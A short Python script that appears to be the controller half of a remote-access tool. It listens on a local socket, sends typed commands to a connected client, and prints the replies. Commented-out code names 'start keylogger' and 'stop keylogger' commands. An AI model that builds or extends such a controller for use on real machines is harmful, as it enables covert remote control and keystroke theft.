import socket, pickle

HOST = '127.0.0.1'
PORT = 44102

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    print("socket created and listening")

    server.listen(5)
    print("socket listening")

    while True:
        c, addr = server.accept()
        print(f"conection received from {addr}")
        
        while True:
            command = input("enter command: ").split()
            if command[0] == "exit":
                break
            else:
                data = pickle.dumps(command)
                c.sendall(data)
                response = c.recv(1024).decode('utf-8')
                print(response)
            # if command[0] == "ls":
            #     data = pickle.dumps(command)
            #     c.sendall(data)
            # if command == ['start', 'keylogger']:
            #     data = pickle.dumps(command)
            #     c.sendall(data)
            # if command == ['stop', 'keylogger']:
            #     data = pickle.dumps(command)
            #     c.sendall(data)
        c.close()
        break

except Exception as err:
    print(f"socket creation fialed: {str(err)}")

finally:
    server.close()




# def start(): 
#     webserver.run()


# start()